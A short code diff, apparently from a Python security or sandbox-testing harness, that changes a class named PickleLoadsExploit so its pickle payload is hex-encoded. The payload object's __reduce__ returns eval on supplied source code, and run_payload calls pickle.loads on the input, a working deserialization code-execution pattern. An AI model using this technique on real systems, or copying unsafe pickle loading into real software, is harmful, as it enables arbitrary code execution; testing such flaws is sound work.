@@ -82,9 +82,10 @@ class PickleLoadsExploit(SimplePythonExploit):
             def __reduce__(self):
                 return (eval, (source_code,))
 
-        return pickle.dumps(Exploit())
+        return pickle.dumps(Exploit()).hex()
 
     def run_payload(payload: str) -> None:
+        payload = bytes.fromhex(payload)
         obj = pickle.loads(payload)
 
 
